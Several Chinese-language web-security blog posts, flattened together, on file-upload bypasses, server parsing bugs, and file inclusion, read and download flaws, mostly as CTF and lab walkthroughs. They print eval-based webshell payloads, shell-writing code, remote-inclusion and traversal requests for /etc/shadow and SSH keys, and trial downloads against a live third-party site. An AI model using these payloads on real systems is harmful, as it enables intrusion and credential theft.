PHP_INI_PERDIR 这个模式当中的 auto_append_file 和 auto_prepend_file 这两个配置对我们有很大帮助。 **auto_append_file ** ：指定一个文件在主文件解析之前解析； auto_prepend_file：指定一个文件在主文件之后解析。 原理：我们可以使用 auto_prepend_file 这个选项，将我们所要上传的图片马在该目录下的其它PHP文件执行之前首先 包含 我们所上传的图片马。相当于在原有的 PHP文件的代码开头加上了 require(&#39;a.jpg&#39;) ，从而进行了 文件包含，这样我们的图片马就得到了利用。 优点：不仅仅限于 Apache 服务器，还可以用于 Nginx , IIS 等服务器。 使用条件： 上传的 .user.ini 目录下必须含有 .php 文件，而一般的题目当中不会含有。 服务器使用CGI／FastCGI模式 利用： 123.user.ini 文件：GIF89a auto_prepend_file=a.jpg 123a.jpg :GIF89a&lt;script language=&#x27;php&#x27;&gt; @eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt; 五、Web容器解析漏洞5.1 Apache 解析漏洞5.1.1 多后缀文件解析漏洞Apache当中，多后缀文件将会从最右边的后缀开始识别，如果后缀不在对应的 MIME type 或者是 Hander，就会继续向左识别，直到后缀有对应的MIME type 或 Hander。 利用： 1phpinfo.php.xxx.xx.x 注：该漏洞比较古老，大部分已经修复过了，但是会出现在CTF中 5.1.2 CVE-2017-15715 漏洞适用版本：2.4.0-2.4.29版本 利用： 1phpinfo.php\\n ###xxx.asp;1.jpg 123将上传的 time.asp文件 抓包 修改后缀成为：time.asp;1.jpg //像这样的文件名可以通过白名单，但是却可以被解析为 .asp文件# 内容：&lt;%=time()%&gt; 作为试验 5.1.3 x.asp/time.jpg123首先创建一个文件夹：例如：1.asp上传.asp文件：time.jpg //内容：&lt;% =time()%&gt; &lt;% =now()%&gt;访问：1.asp/time.jpg //将会被当作.asp文件进行解析 5.3 PHP CGI 解析漏洞条件：IIS 7.0 / 7.5 1.搭建 IIS 服务器 win-2008 下一步，点击安装 2.使 IIS 支持 PHP脚本类型 ……未完成 最终的效果是： 1234phpinfo.png 该图片的内容是 &lt;?php phpinfo(); ?&gt; 但是无法直接访问 而如果 访问 phpinfo.png/.php 就可以被解析 防御避免只需要： 本质上是与 php.ini 中的 cgi.fix_pathinfo 配置选项有关，等于1即有漏洞，等于0则无。 六、Nginx 解析漏洞6.1 Nginx 解析漏洞 原理与PHP CGI 解析漏洞相同–与 php.ini 中的 cgi.fix_pathinfo 配置选项有关，等于1即有漏洞，等于0则无。 1phpinfo.php/.php 6.2 Nginx 空字节漏洞(零零截断)12phpinfo.html%00.php .php 后缀 使 Nginx 将 phpinfo.html文件 当作 php文件处理 6.3 Nginx 文件名逻辑漏洞(零零截断)12上传 phpinfo.png空格访问 phpinfo.png ..php 其中将第一个 . 的十六进制更改为 00 6.4 文件名逻辑漏洞 (CVE-2013-4547)受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x 1正常上传一个附加代码的图片&quot;test.jpg&quot;，访问时后面+&quot;空格&quot;+&quot;\\0&quot;+&quot;.php&quot;，即让图片作为php文件解析 七、编辑器上传网站的后台编辑网页的在线编辑器，一般都会自动集成文件上传的功能，有些含有文件上传漏洞。 evebeditor 进入后台可修改 相关配置 ，比如上传文件的 白名单，我们可以添加上我们想上传的脚本类型；或者是在配置当中写入一句话木马，例如将该网页的一些标题更改为我们的一句话木马，等待别人上钩。 fckeditor 后台资源管理器，直接进行上传 技巧：抓包查看时，可以看到其Web服务器，可以利用相关的Web服务器的解析漏洞进行上传，例如：IIS解析漏洞； 如果所访问的服务器进行了防御，当我们成功上传大马之后，当我们进行访问时，它会自动跳转到别的地方，达不到我们想要的效果。 思路：首先上传一个小马，拿到webshell之后，在别的路径之下再上传我们的大马 八、零零截断8.1 0x00截断原理系统在对文件名的读取时，如果遇到ascii码为零的位置就停止，而这个ascii码为零的位置在16进制中是00，用0x开头表示0x00，就会认为读取已结束，也就是所说的0x00截断。 8.2 URL中的 %00系统是按16进制读取文件，URL中的 %00 是被服务器解码为 0x00 而发挥了截断作用。 8.3 截断利用利用条件：php版本小于 5.3.4 且 魔术引号关闭 URL中的 %00 会自动被解码为 0x00 ，所以需要时直接输入上 %00 ，即可发挥截断作用；以其它方式提交并且需要截断时，需要将其解码为十六进制的相应位置手动更改为 00 ，才能发挥截断作用。 GET 方式提交–会自动将 %00 解析为 0x00 ，发挥截断作用 POST 方式提交–需要手动将其解码为 十六进制的 00 ，发挥截断作用 九、实战9.1 由变量覆盖引起的文件上传漏洞metinfov5.0.4 修改变量的值–意味着可修改配置–可覆盖数据库用户名，密码，等待内容，使其连接到自己的服务器上 foreach遍历数组 12345678&lt;?php $name = &quot;aaa&quot;;//传参 ?name=bbb foreach($_GET as $key =&gt; $val)&#123; $$key = $val; //将变成 $name = bbb &#125; var_dump($name); //这样相当于将上面的$name的值通过我们的GET传参进行了修改?&gt; 9.2 常见 CMS 文件上传漏洞CMS – 内容管理系统，常被用于 通过使用其上的网站模板二进行二次开发，从而 快速建站 dedeCMS PHPcms 南方数据管理系统 .asp access .mdb文件 SQL注入 查询 管理员密码 御剑扫描 后台 进行登录 文件上传 大马，绕过限制，获取路径 通过所上传的图片木马路径进行 数据库备份 将后缀备份成为 .asp 防御： 站库分离 不给 Databackup 执行权限 对 数据库备份功能 的过滤：数据库名称不可更改（后缀强制为.mdb） 所备份的名称 不允许更改后缀 9.3 upload-labs – Pass-21Pass-2112345678910111213explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组示例：&lt;?php$str = &quot;www.runoob.com&quot;;print_r (explode(&quot;.&quot;,$str));?&gt;运行结果：Array( [0] =&gt; www [1] =&gt; runoob [2] =&gt; com) 1count() 函数返回数组中元素的数目 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //检查MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名 $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;文件上传失败！&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;请选择要上传的文件！&quot;;&#125; 123456分析：1.首先判断 MIME 类型，必须为 &#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;2.判断 $_POST[&#x27;save_name&#x27;]是否为空，不为空的话，就将 $_POST[&#x27;save_name&#x27;] 赋值给 $file3.判断 $file 是否为数组，不是的话，使用 . 将其分割为数组元素4.判断文件后缀名：取 $file 数组的最后一个元素 作为 $ext 的值，判断是否符合白名单5.符合的话，使用 reset($file)函数取 数组 $file的第一个元素，拼接一个&quot;.&quot;，然后再拼接上 该数组含有元素个数-1 的元素 作为文件名 123456绕过分析：1.抓包更改 MIME类型--image/jpeg2.将用户所输入的 &quot;save_name&quot; 更改为一个数组，并赋值：$save_name[0] = 2121.php/；$save_name[1] = NULL;$save_name[2] = jpg3.则 $file 本身就成为了一个数组，不会被 . 分割；reset($file) 将会是 $file 的第一个元素，即 2121.php/；由于 $file[1] = NULL（不可以这么说，因为NULL不等于空，如果像这样设置$file[1] = NULL，count()所计算的个数当中是包含该元素的，这里只是为了便于理解），则count($file) 将会是2，所以最终拼接而成的 $file_name = 2121.php/. 因此解析之后会自动忽略掉 /. ，则最终上传的文件名是 2121.php 9.4 Weblogic 任意文件上传漏洞（CVE-2018-2894）Weblogic 任意文件上传漏洞（CVE-2018-2894） 12345docker-compose builddocker-compose up -d访问 http://192.168.254.110:7001/console查看管理员密码 docker-compose logs | grep password登录进去 十、补充10.1 $_FIFES1234567二、$_FILES$_FILES数组内容：$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 上传文件的大小，单位为字节 $_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 该文件上传相关的错误代码 10.2 截断绕过00截断防御 使用 $_FILES：由于传入的 $_FILES[‘name’] 已经是截断过后的，之后如果使用白名单去判断，显然是不能成功上传的。 **isInvalid()**：可用于判断文件名是否合法，即不允许文件名当中含有 \\0。如果文件名不合法，将抛出异常而退出流程。 转换字符集造成截断条件：PHP版本 &lt; 5.4 iconv() 函数可以将一种已知的字符集文件转换成另一种已知的字符集文件。它的作用是在多种国际编码格式之间进行文本内码的转换。","categories":[{"name":"web","slug":"web","permalink":"https://xizhi-future.github.io/categories/web/"},{"name":"文件上传","slug":"web/文件上传","permalink":"https://xizhi-future.github.io/categories/web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"文件上传","slug":"文件上传","permalink":"https://xizhi-future.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"漏洞","slug":"漏洞","permalink":"https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"author":"xizhi-future"},{"title":"文件包含、读取、下载漏洞","slug":"文件包含、读取、下载漏洞","date":"2021-06-06T14:42:17.000Z","updated":"2021-07-09T07:26:47.102Z","comments":true,"path":"2021/06/06/文件包含、读取、下载漏洞/","link":"","permalink":"https://xizhi-future.github.io/2021/06/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E8%AF%BB%E5%8F%96%E3%80%81%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/","excerpt":"概述：有关文件的常见漏洞：包括文件包含漏洞、文件读取漏洞、文件下载漏洞。","text":"概述：有关文件的常见漏洞：包括文件包含漏洞、文件读取漏洞、文件下载漏洞。 一、文件包含漏洞–文件被解析就是将所包含的文件当作脚本去执行 PHP当中包含函数 函数 描述 include() 文件包含失败时，会产生 警告，但脚本 将继续执行 include_once() 作用与include()相同，但文件只会被包含一次 require() 文件包含失败时，会产生 错误， 直接结束脚本执行 require_once() 作用与require()相同，但文件只会被包含一次 成因 1.Web应用实现了 动态包含2.动态包含的文件路径参数，客户端可控 相关配置 本地文件包含 (LFI)：可以读取与打开本地文件远程文件包含 (RFI)(HTTP,FTP,PHP伪协议)：可以远程加载文件 123php.ini文件：本地：allow_url_fopen=On/Off远程：allow_url_include-On/Off 1234567&lt;?phpif(isset($_GET[&#x27;path&#x27;]))&#123; include $_GET[&#x27;path&#x27;];&#125;else&#123; echo &quot;?path=info.php&quot;;&#125;?&gt; 12345本地：可通过相对路径方式找到文件?path=info.php远程：可通过http(s)或者ftp等方式远程加载文件?path=http://......info.php?path=ftp://......info.php 分类 allow_url_fopen = On allow_url_include = On 本地文件包含：通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行 远程文件包含：就是允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。 此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码 1?path=http://192.168.158.119/phpinfo.php 1. 漏洞说明1.1 无视文件扩展名读取文件使用 文件包含 时，php会读取文件的源码，即使是图片文件。当通过文件包含的方式打开一张图片时，会发现并没有打开图像，而是图片的 源码 。 1.2 无条件解析PHP代码文件包含 在读取文件源码的同时，如果遇到符合php语法规范的代码，就会无条件执行。无论是什么格式的文件。例如：phpinfo.zipphpinfo.rar phpinfo.txt 1.3 空字符安全绕过–00截断条件：PHP版本小于5.3.4，并且关闭魔术引号 magic_quotes_gpc = Off 1234567891011index.php&lt;?phpif(isset($_GET[&#x27;path&#x27;]))&#123; include $_GET[&#x27;path&#x27;].&quot;.html&quot;;&#125;else&#123; echo &quot;?path=[path]&quot;;&#125;?&gt;index.html&lt;h1&gt;Hello World!&lt;/h1&gt; 魔术引号的存在关闭魔术引号验证 1.4 长度截断利用操作系统对目录最大长度的限制，可以不需要 %00 而达到截断的目的 目录字符串，在 window下256字节、linux下4096字节 时会达到最大值，最大值长度之后的字符将被丢弃。 而利用”./“的方式即可构造出超长目录字符串 条件：Windows系统， 12345678index.php #限制了文件后缀&lt;?phpif(isset($_GET[&#x27;path&#x27;]))&#123; include $_GET[&#x27;path&#x27;].&quot;.html&quot;;&#125;else&#123; echo &quot;?path=[path]&quot;;&#125;?&gt; 1.5 问号,%20,%23 截断远程文件包含时，如果出现 12345678index.php #限制了文件后缀&lt;?phpif(isset($_GET[&#x27;path&#x27;]))&#123; include $_GET[&#x27;path&#x27;].&quot;.html&quot;;&#125;else&#123; echo &quot;?path=[path]&quot;;&#125;?&gt; 1234#绕过：添加问号 结合HTTP传参的原理,问号&quot;?&quot;后面的代码被解释成URL的querystring?path=http://192.168.158.119/phpinfo.php??path=http://192.168.158.119/phpinfo.php%20?path=http://192.168.158.119/phpinfo.php%23 2. 漏洞利用2.1读取敏感文件123456使用绝对路径：http://192.168.199.131/include/include.php?path=c:\\windows\\System32\\drivers\\etc\\hosts如果当前文件夹与所要包含的文件夹在同一盘符下： #可目录穿越http://192.168.199.131/include/include.php?path=..\\..\\..\\..\\..\\..\\..\\..\\windows\\System32\\drivers\\etc\\hosts 2.1.1 常见敏感信息路径1234567891011121314151617181920212223242526272829#Windows系统c:\\boot.ini // 查看系统版本c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码c:\\ProgramFiles\\mysql\\my.ini // MySQL配置c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码c:\\windows\\php.ini // php 配置信息#Linux/Unix系统/etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件 2.2 包含图片木马12345http://192.168.199.131/include/include.php?path=./future_ma1.jpgfuture_ma1.jpg 是经过 &lt;?php @eval($_REQUEST[&#x27;aaa&#x27;]); ?&gt; 处理过的图片木马可中国蚁剑进行连接 2.3 包含木马写 shell123将如下代码插入图片当中：&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;); ?&gt;含义：在当前目录下创建一个shell.php文件，内容为&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;一句话木马，当直接包含文件时，就会执行。 2.4 PHP 封装协议条件： 123php.ini文件：本地：allow_url_fopen=On远程：allow_url_include=On 2.4.1 访问本地文件12#使用file://协议?path=file://c:\\windows\\System32\\drivers\\etc\\hosts 123#data://协议?path=data://text/plain,&lt;?php phpinfo(); ?&gt;?path=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== 123456789#具体示例：#当前文件路径?page=data://text/plain, &lt;?php echo $_SERVER[&#x27;DOCUMENT_ROOT&#x27;]; ?&gt; #遍历当前路径下的所有文件?page=data://text/plain, &lt;?php print_r(scandir(&#x27;/var/www&#x27;))?&gt; #读取指定文件 ?page=data://text/plain, &lt;?php $a = file_get_contents(&#x27;fl4gisisish3r3.php&#x27;);echo htmlentities($a); ?&gt; 2.4.2 读取PHP文件123?path=php://filter/read=convert.base64-encode/resource=phpinfo.php将所得内容进行 base64解码即可 2.4.3 执行PHP命令123?file=php://inputpost:&lt;?php system(&#x27;ipconfig&#x27;);?&gt; &lt;?php system(&#x27;whoami&#x27;);?&gt; 2.5 包含日志文件nigux 日志文件路径 /var/log/nginx/assess.log /var/log/nginx/error.log apache+Linux日志默认路径 /etc/httpd/logs/access_log/var/log/httpd/access_log apache+win2003日志默认路径 12D:\\xampp\\apache\\logs\\access.logD:\\xampp\\apache\\logs\\error.log IIS6.0+win2003默认日志文件 1C:\\WINDOWS\\system32\\Logfiles IIS7.0+win2003 默认日志文件 1%SystemDrive%inetpublogsLogFiles nginx 日志文件在用户安装目录的logs目录下 如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里 也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log） 2.5.1 Apache 错误日志文件 getshellphpstudy2016(Apache)+Win2003 D:\\phpStudy\\Apache\\logs\\error.log 构造一句话木马写入 Apache日志文件当中 访问 蚁剑连接 phpstudy小皮面板(Apache)+Win10 D:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs 2.5.2 session 文件包含12345&lt;?phpsession_start();$ctfs=$_GET[&#x27;ctfs&#x27;];$_SESSION[&quot;username&quot;]=$ctfs;?&gt; 如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。 2.6 任意目录遍历 ../../防御：php.ini 当中的配置 open_basedir ，将很好可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。而没有设置open_basedir时，文件包含漏洞可以访问任意文件。 经查看之后，各个版本的php该配置默认如下： 修改配置，只允许用户包含指定目录下的文件 再次尝试包含非指定目录下的文件 123456#各种语言文件包含#ASP ASPX PHP JSP Python Javaweb&lt;c:import url=&quot;http://...&quot;&gt;&lt;jsp:include page=&quot;head.jsp&quot;/&gt;&lt;%@ include file=&quot;head.jsp&quot;%&gt;&lt;?php include (&#x27;test.php&#x27;) ?&gt; 3. 漏洞防御 严格限制包含中的参数，取消那些不可控的参数。 开启open_basedir 配置，将其设置为指定目录，则只有该目录的文件允许被访问 如果不需要文件包含，则关闭allow_url_include()函数，防止远程文件包含 固定后缀 固定文件 WAF 产品 检测： 白盒：代码审计 黑盒：漏扫工具，公开漏洞，手工查看参数以及功能点 利用： http ftp ftp://username:password@192.168.0.1:21/profile file 各种脚本支持的协议 二、文件读取漏洞–显示源代码12345&lt;?php $filename=”test.txt”;readfile($filename);?&gt; #输出文件内容 12345&lt;?php$filename=”test.txt”;echo file_get_contents($filename);?&gt; #将整个文件读入一个字符串 相关函数： 1234readfile()file_get_contents()fopen()变量：$filename 2.1 百度杯2017二月-Zone真题复现网址 分别抓包，修改参数 login=1 试试 发现修改 Mini-Zone 数据包当中的 login=1 之后成功进入管理员的界面 对 manage 再抓包，修改 login=1 ，获取 /manages/admin.php?module=index&amp;name=php 。 mvc架构 读取nginx配置文件 1GET /manages/admin.php?module=..././..././..././etc/nginx/nginx.conf&amp;name= HTTP/1.1 获得返回200 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127HTTP/1.1 200 OKDate: Fri, 16 Apr 2021 14:13:40 GMTContent-Type: text/html; charset=UTF-8Connection: closeVary: Accept-Encodingcontent-text: text/html;charset=gbkX-Via-JSL: 38ae086,-X-Cache: bypassContent-Length: 2708 #user nobody;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;#pid run/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; #log_format main &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27; # &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27; # &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; #server &#123; # listen 80; # server_name localhost; #charset koi8-r; #access_log logs/host.access.log main; # location / &#123; # root html; # index index.html index.htm; # &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # # error_page 500 502 503 504 /50x.html; # location = /50x.html &#123; # root html; # &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \\.php$ &#123; # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache&#x27;s document root # concurs with nginx&#x27;s one # #location ~ /\\.ht &#123; # deny all; #&#125; #&#125; # another virtual host using mix of IP-, name-, and port-based configuration # #server &#123; # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location / &#123; # root html; # index index.html index.htm; # &#125; #&#125; # HTTPS server # #server &#123; # listen 443 ssl; # server_name localhost; # ssl_certificate cert.pem; # ssl_certificate_key cert.key; # ssl_session_cache shared:SSL:1m; # ssl_session_timeout 5m; # ssl_ciphers HIGH:!aNULL:!MD5; # ssl_prefer_server_ciphers on; # location / &#123; # root html; # index index.html index.htm; # &#125; #&#125; include sites-enabled/default;//包含文件&#125; 再尝试 1GET /manages/admin.php?module=..././..././..././etc/nginx/sites-enabled/default&amp;name= HTTP/1.1 所获取到的内容有 1234location /online-movies &#123; alias /movie/; autoindex on; &#125; 继续构造 1GET /online-movies../var/www/html/flag.php HTTP/1.1 参考 2.2 小米路由器远程任意文件读取小米路由器远程任意文件读取 Fofa搜索 1http://192.168.31.1/api-third-party/download/extdisks../etc/shadow 三、文件下载漏洞–文件被下载 一般文件：后台首页日志等可见文件 敏感文件： 配置文件（数据库，平台，） 各种接口文件 密钥信息等文件 文件下载方式： 1&lt;a href=”http://www.a.com/xxx.rar”&gt;下载&lt;/a&gt; 123456789&lt;?php $filename = $_GET[&#x27;filename&#x27;]; echo &#x27;&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;&#x27;; echo file_get_contents($filename); header(&#x27;Content-Type: imgage/jpeg&#x27;); header(&#x27;Content-Disposition: attachment; filename=&#x27;.$filename); header(&#x27;Content-Lengh: &#x27;.filesize($filename));?&gt; 3.1 Pikachu 之 Insafe Filedownload — 参数值--?filename=12docker build -t &quot;pikachu&quot; .docker run -d -p8080:80 pikachu 123456789#图片所在位置http://pikachu/vul/unsafedownload/download/ai.png#下载图片链接pikachu/vul/unsafedownload/execdownload.php?filename=ai.png#得知 download/ 和 execdownload.php 在 unsafedownload/目录下#尝试下载 execdownload.phppikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php 下载成功 我们继续根据 execdownload.php 这个文件当中的内容获取一些文件的路径，进而继续下载，发现 12include_once $PIKA_ROOT_DIR.&quot;inc/function.php&quot;;$file_path=&quot;download/&#123;$_GET[&#x27;filename&#x27;]&#125;&quot;; 尝试 1http://pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php 成功下载 工具扫描配置文件 ：config.inc.php 获取数据库账户密码等配置信息 3.2 znds 网站 – 功能点znds 随便下载一款软件，右键 复制下载链接 12345678#下载好的文件名： xxpt_1.0.5_dangbei.apk#下载链接： http://down.znds.com/getdownurl/?s=L2Rvd24vMjAxODExMjAveHhwdF8xLjAuNV9kYW5nYmVpLmFwaw==#加密部分： /down/20181120/xxpt_1.0.5_dangbei.apk#清晰的URL： http://down.znds.com/getdownurl/?s=/down/20181120/xxpt_1.0.5_dangbei.apk 信息收集，获取网站脚本类型，使用相应的脚本文件去扫描/下载 示例：记得加密 1234尝试下载其它文件：http://down.znds.com/getdownurl/index.php/?s=index.php对应加密：http://down.znds.com/getdownurl/?s=aW5kZXgucGhw 3.3 RoarCTF2019-文件读取真题复现 – JAVAWEBRoarCTF2019-文件读取真题复现 对 help 右键 复制链接地址 ，发现是 文件下载 1http://0e351c4c-e667-4d71-8086-639b36d07883.node3.buuoj.cn/Download?filename=help.docx 将 filename 参数使用 post 传递，发现可下载 help.docx 很显然，是耍你的 Java开发 当中的一个 经常使用的配置文件 WEB-INF/web.xml，会记录许多信息，尝试下载 发现含有 Flag文件，尝试下载 1http://0e351c4c-e667-4d71-8086-639b36d07883.node3.buuoj.cn/Flag 显然，路径不正确 实际上 关键点在于 ，JAVA开发过程中，其文件是储存在它的控制器当中的，路径如下：因为Java字节码类文件（.class）是Java编译器编译Java源文件（.java）产生的“目标文件”。最终得出flag的关键文件位置为：/WEB-INF/classes/com/wm/ctf/FlagController.class 1filename=WEB-INF/classes/com/wm/ctf/FlagController.class 四、总结参数发现： 123456789101112131415161718192021222324252627282930read.xxx?filenamedown.xxx?filenamereadfiledownfile&amp;readpath&amp;filepath&amp;inputfile&amp;url&amp;data&amp;readfile&amp;menuMETA-INFWEB-INF&amp;RealPath=&amp;FilePath=&amp;ﬁlepath=&amp;Path=&amp;path=&amp;inputFile=&amp;url=&amp;urls=&amp;Lang=&amp;dis=&amp;data=&amp;readﬁle=&amp;ﬁlep=&amp;src=&amp;menu=META-INFWEB-INF Windows 敏感信息： 1234567C:\\boot.ini //查看系统版本C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件C:\\Windows\\repair\\sam //存储系统初次安装的密码C:\\Program Files\\mysql\\my.ini //Mysql配置C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql rootC:\\Windows\\php.ini //php配置信息C:\\Windows\\my.ini //Mysql配置信息 Linux 敏感信息： 12345678910111213/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts/etc/passwd/etc/shadow/etc/my.cnf/etc/httpd/conf/httpd.conf/root/.bash_history/root/.mysql_history/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts/porc/config.gz 利用思路： 下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置 下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。 下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。 总的来说，所有与前端交互的数据都是不安全的，不能掉以轻心！ 参考","categories":[{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/categories/Web/"},{"name":"漏洞","slug":"Web/漏洞","permalink":"https://xizhi-future.github.io/categories/Web/%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"漏洞","slug":"漏洞","permalink":"https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"文件包含","slug":"文件包含","permalink":"https://xizhi-future.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"author":"xizhi-future"},{"title":"CTF之PHP","slug":"CTF之PHP","date":"2021-06-06T14:42:17.000Z","updated":"2021-07-09T07:52:08.378Z","comments":true,"path":"2021/06/06/CTF之PHP/","link":"","permalink":"https://xizhi-future.github.io/2021/06/06/CTF%E4%B9%8BPHP/","excerpt":"","text":"一、PHP CTF1.1 PHP 弱类型123== 和 != 比较若类型不同，先偿试转换类型，再作值比较，最后返回值比较结果 。而=== 和 !== 只有在相同类型下,才会比较其值。 **== 与 ===**：== 不包括 类型，=== 包括 类型 **==**：遇到字符串与数值进行比较时，先将字符串类型转换成数值型，再进行比较 123转换方法：如果该字符串没有包含&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;并且 其数值在整型的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。 1234567&lt;?phpvar_dump(&quot;admin&quot;==0); //truevar_dump(&quot;1admin&quot;==1); //truevar_dump(&quot;admin1&quot;==1) //falsevar_dump(&quot;admin1&quot;==0) //truevar_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true 科学技术法，0的无论多少次方都是0?&gt; 1234567&lt;?php2 $test=1 + &quot;10.5&quot;; //$test=11.5(float)3 $test=1+&quot;-1.3e3&quot;; //$test=-1299(float)4 $test=1+&quot;bob-1.3e3&quot;; //$test=1(int) 开头部分是不合法的数值，字符串 转 整型05 $test=1+&quot;2admin&quot;; //$test=3(int)6 $test=1+&quot;admin2&quot;; //$test=1(int)7 ?&gt; **===**：首先判断二者 类型是否相同，若不同直接为0，若类型相同，再比较数值 123456789101112131415161718&lt;?phpvar_dump(a===0); //falsevar_dump(1===1); //truevar_dump(&#x27;qw&#x27;===1); //false//注意：var_dump(&#x27;000&#x27;===0); //falsevar_dump(&#x27;a&#x27;===a); //truevar_dump(&#x27;1&#x27;===1); //falsevar_dump(&quot;QNKCDZO&quot; !== &quot;s878926199a&quot;);//truevar_dump(md5(&quot;QNKCDZO&quot;) === md5(&quot;s878926199a&quot;));//falsevar_dump(&quot;0e830400451993494058024219903391&quot; === &quot;0e545993274517709034328855841020&quot;);//falsevar_dump(&quot;0&quot; === 0);///falsevar_dump(&quot;01a&quot; === 0);//false ?&gt; 如果一个数值和一个字符串比较，那么会将字符串转换为数值 